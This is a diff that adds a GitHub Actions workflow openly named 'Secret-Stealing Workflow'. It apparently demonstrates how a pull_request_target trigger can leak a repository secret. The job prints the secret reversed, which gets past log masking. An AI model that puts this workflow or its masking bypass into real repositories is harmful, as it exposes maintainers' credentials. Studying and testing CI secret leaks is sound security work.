@@ -1,0 +1,14 @@
+name: "Secret-Stealing Workflow"
+
+on:
+  pull_request_target:
+    types: edited
+
+jobs:
+  steal-secret:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Steal the secret
+        run: echo "The secret is $(echo $SECRET | rev)"
+        env:
+          SECRET: ${{ secrets.VERY_SECRET_INFO }}
